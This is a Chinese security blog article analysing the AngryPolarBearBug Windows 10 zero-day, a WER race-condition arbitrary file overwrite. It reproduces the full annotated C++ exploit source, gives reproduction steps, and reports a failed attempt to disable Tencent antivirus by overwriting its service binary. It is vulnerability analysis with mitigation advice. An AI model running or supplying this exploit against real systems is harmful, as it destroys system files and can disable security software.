***本文原创作者：markyu，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 漏洞名称

windows任意文件覆盖。

## 漏洞介绍

安全研究员SandboxEscaper披露Windows操作系统中第四个0-day漏洞的漏洞利用代码，利用该漏洞可以覆盖任意Windows10文件，包括通常无法访问的基本文件，例如SandboxEscaper在POC中给出的pci.sys文件，直接造成系统拒绝服务，当然可以用此方法来关闭第三方杀软，原文如下：

![image.png](https://image.3001.net/images/20190105/1546687627_5c30948b8c5ae.png!small)其漏洞发生模块为WER(Windows
error
report),WER是一个灵活的基于事件的反馈基础架构，用户收集硬件和软件发生问题时进行异常回收，然后发送给Microsoft，并给用户提示合适的异常解决方法。

当发生异常时，首先需要使用一系列参数描述该异常，例如应用名字、应用版本、模块名字、模块版本、错误代码等，然后根据这个异常描述,WER模块便通常查询WER服务器给用户返回一个异常修复方法，假如WER服务器上存在该描述的异常，则直接返回解决方案然后通过WER显示给用户，假如WER服务器上没有改描述的异常，则返回一个状态码，通过WER显示并询问用户是否将当前错误发送给微软用于以后研究。  

## 漏洞本质

Time of Check Versus Time of
Use（TOCTOU），原理参考<https://www.freebuf.com/vuls/192876.html>。

## 漏洞利用基础环境

原文中描述该漏洞成功利用限制较多，最少要满足以下三个要求，但经过测试，其必须连接网络要求可以并不需要，实际限制条件只有下面两个：

> 1.系统版本必须为windows10（其他版本win7、win2008、win2012经测试均无法复现利用），
>
> 2.非单个CPU（单CPU多内核也是不满足条件的）

再没有网络连接的时候，在win10上是可以成功复现的，只是会在C:\ProgramData\Microsoft\Windows\WER\ReportQueue路径下留下了\1_1_1_1_1\Report.wer文件，即表示该文文件未成功发送给wer服务器：

![image.png](https://image.3001.net/images/20190105/1546688221_5c3096dd490d1.png!small)

## POC验证与利用

1.下载<https://github.com/SandboxEscaper/randomrepo/blob/master/angrypolarbearbug.rar>POC文件。

2.桌面新建test.txt，随意输入内容：

![image.png](https://image.3001.net/images/20190105/1546688696_5c3098b8119f7.png!small)3.确保Report.wer和AngryPolarBearBug.exe在同一目录，运行POC文件。  

![image.png](https://image.3001.net/images/20190105/1546688745_5c3098e987706.png!small)![image.png](https://image.3001.net/images/20190105/1546688764_5c3098fc1f143.png!small)4.被覆盖后的test.txt文件如下：

![image.png](https://image.3001.net/images/20190105/1546688809_5c3099290ad96.png!small)

## POC原理分析

任意文件覆盖利用成功主要在于主程序中runme（自己创建的线程，在该线程中使用硬链接方式覆盖目标文件）与system（使用计划任务给wer服务器发送异常报告）这两个线程函数存在时间竞争，关于具体实现过程可参考下面源码注释：

    
    
    #include <iostream>
    #include "stdafx.h"
    #include <stdio.h>
    #include <tchar.h>
    #include <Windows.h>
    #include <strsafe.h>
    const char* targetfile;//定义一个指向需要被覆盖的文件的指针
    bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);//CreateNativeHardlink声明，用于创建一个硬链接
    std::wstring s2ws(const std::string& str)//将多字节编码转换成宽字节编码
    {
    	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);//获取需要的缓冲区大小，类型为int型
    	std::wstring wstrTo(size_needed, 0);//申请空间时，将缓冲区大小按字符计算
    	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    	return wstrTo;
    }
    DWORD WINAPI MyThreadFunction(LPVOID lpParam)//定义自己的线程函数
    {
    	LPCWSTR filename1;//LPCWSTR指向unicode编码字符串的32位指针
    	LPCWSTR root = L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\";
    	HANDLE hDir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",FILE_LIST_DIRECTORY,FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
    	FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];//FILE_NOTIFY_INFORMATION定义一个文件通知结构体
    	DWORD dwBytesReturned = 0;
    	std::wstring extension = L".xml";
    	
    	std::string targetf(targetfile);
    	std::wstring targetfw = s2ws(targetf);
    	bool blah = false;
    	const wchar_t* targetfww = targetfw.c_str();//targetfww为最终转换后的指向需要被覆盖的文件的指针
    	while (TRUE)
    	{
    		ReadDirectoryChangesW(hDir, (LPVOID)&strFileNotifyInfo, sizeof(strFileNotifyInfo), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &dwBytesReturned, NULL, NULL);//监控到hDir指向的目录下是否有文件发生改变
    		filename1 = strFileNotifyInfo[0].FileName;//获取变化的文件名
    		std::wstring df = std::wstring(root) + filename1;//构造变化的文件的绝对路径
    		std::wstring::size_type found = df.find(extension);//判断该文件后缀是否为xml
    		if (found != std::wstring::npos)//匹配到了后缀为xml的文件
    		{
    			LPCWSTR dfc = df.c_str();//指向该变化文件的绝对路径
    			do
    				{
    				blah = CreateNativeHardlink(dfc,targetfww);//创建一个硬链接，当dfc文件变化时，targetfww文件（需要被覆盖的文件）也会跟着变化
    				} while (blah == false);//成功返回1,跳出创建线程的循环
    				return 0;
    		}
    	}
    	return 0;
    }//那么我们现在只需要创造出一个异常，并保存到C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp目录下，调用该函数时便会成功执行，即覆盖我们的目标文件
    
    void runme() {  //创建一个线程
    	HANDLE mThread = CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);//线程安全属性、堆栈大小、线程函数、线程参数、线程创建属性、线程ID
    }
    int main(int argc, const char * argv[])
    {
    	if (argc < 2) {  //判断输入的参数格式是否正确
    		std::cout << std::endl << "Please include a filepath as first parameter";
    		return 0;
    	}
    	DWORD dwFileSize = 0;
    	DWORD dwFileSize2 = 0;
    	targetfile = argv[1];//指向获取需要被覆盖的目标文件绝对路径
    	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);//打开需要被覆盖的目标文件
    	if (hFile == INVALID_HANDLE_VALUE)//打开需要被覆盖的目标文件句柄时发生异常了
    	{
    		std::cout << std::endl << "I do not have read permissions for this file or file does not exist";
    		return 0;
    	}
    	dwFileSize = GetFileSize(hFile, NULL);//先获取需要被覆盖的目标文件的大小，用于下面判断该文件是否已经被覆盖
    	dwFileSize2 = dwFileSize;
    	CloseHandle(hFile);//关闭目标文件句柄
    	std::cout << std::endl
    		<< "/////////////////////////////////////////////////////////" << std::endl
    		<< "//抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖抖抖抖抖抖ЁЁЁЁ抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖抖抖抖?``````````````11Ё抖抖抖抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖抖抖1````````````````````````1Ё抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖抖``````````````````````````````Ё抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖锭```````````````````````````````````1Ф抖抖抖抖抖?/" << std::endl
    		<< "//抖``````````````````````````````````````1Ф抖抖抖抖//" << std::endl
    		<< "//抖``````````BIPOLAR BEAR`````````````````````1Ф抖抖?/" << std::endl
    		<< "//?`1`````````````````````````````````````````1`1抖抖?/" << std::endl
    		<< "//锭抖```````````````````````````````````````````1Ф?/" << std::endl
    		<< "//抖禶Ё```````````````````````````````````````````Ф抖//" << std::endl
    		<< "//抖1``1```````````````````````111Ё抖抖抖ЁФ抖抖抖?/" << std::endl
    		<< "//抖````1````````````````````1Ё抖抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//锭`````````````11`````````Ё``1抖抖抖抖抖抖抖抖抖抖//" << std::endl
    		<< "//禶`````1抖```````抖抖1`````?````抖抖抖抖抖抖抖抖抖抖//" << std::endl
    		<< "//禶````Ф抖?`````抖抖```抖1````1抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//```Ф抖抖禶```1抖抖```抖禶````抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "//禶```Ф抖抖禶```1抖抖```抖抖````1抖抖抖抖抖抖抖抖抖//" << std::endl
    		<< "//抖111`11抖抖1``````1抖```1Ф?````11抖抖抖抖抖抖抖?/" << std::endl
    		<< "//抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖抖?/" << std::endl
    		<< "/////////////////////////////////////////////////////////" << std::endl;
    	std::cout << std::endl << "---------------------------------BIPOLAR BEAR SALUTES YOU------------------------------------------------------------" << std::endl;
    	Sleep(2000);
    	do {
    
    		CreateDirectoryW(L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\1_1_1_1_1", NULL);//再c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\下创建1_1_1_1_1子目录
    		CopyFileW(L"Report.wer", L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\1_1_1_1_1\\Report.wer", true);//复制当前目录下Report.wer文件到上面创建子目录中，即将该Report.wer异常包加入异常报告队列
    		runme();//在发送异常报告时，会在C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp，目录下产出一个临时文件Report.wer，此时便会被我们自己创建的线程捕获，在线程中替换了目标文件
    		system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");//通过system函数调用计划任务运行WER，模拟系统发送给wer服务器发送异常，故该漏洞利用条件之一需要连接网络
    		HANDLE hFile2 = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);//重新获取目标文件句柄
    		if (hFile2 != INVALID_HANDLE_VALUE)//判断当前文件大小与上一次的文件大小是否相等，假如相等便成功替换
    		{
    			dwFileSize2 = GetFileSize(hFile2, NULL);
    		}
    		CloseHandle(hFile2);
    	} while (dwFileSize == dwFileSize2);
    	std::cout << std::endl << "---------------------------------DATA IN FILE SUCCESSFULLY DESTROYED - Press key to exit------------------------------";
    	getchar();//退出主进程
    }

针对于作者原文中提到利用该漏洞可能绕过第三方杀软，我做了如下测试，测试对象为腾讯的电脑管家，尝试覆盖电脑管家运行时的关键文件以达到关闭杀软的效果。

首先打开任务管理器找到电脑关键的核心服务的QQPCMgr RTP Service
,然后再通过services.msc找到该服务，右击属性找到该服务程序的路径，"C:\Program Files
(x86)\Tencent\QQPCMgr\13.0.19838.236\QQPCRTP.exe"
，那么我们把该文件覆盖掉是不是就可以关闭电脑管家，操作如下：  

![image.png](https://image.3001.net/images/20190105/1546690465_5c309fa11adb4.png!small)尝试覆盖QQPCRTP.exe文件，提示I
do not have read permissions for this file or file does not
exist，发现我们并不能覆盖该文件，导致该错误是由于，POC中是直接通过CreateFile的方式来获取目标文件句柄的，由于该文件处于正在运行状态，导致获取句柄失败，即关闭杀软失败，无法利用该漏洞去覆盖正在运行的程序。

![image.png](https://image.3001.net/images/20190105/1546690555_5c309ffb132fe.png!small)

## 漏洞修复

1.经验证该漏洞只适用于win10系统版本，截至目前，微软官方并未发布补丁，由于该漏洞环境为本地，不可以远程触发，为防止攻击者对该漏洞进行利用，用户不要下载与运行来源不明的软件。  

2.通过services.msc临时关闭Windows Error Reporting Service。

## 参考

<https://github.com/SandboxEscaper/randomrepo/blob/master/angrypolarbearbug.rar>

<https://docs.microsoft.com/en-us/windows/desktop/wer/about-wer>

<https://docs.microsoft.com/zh-cn/windows/desktop/FileIO/hard-links-and-junctions>

***本文原创作者：markyu，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

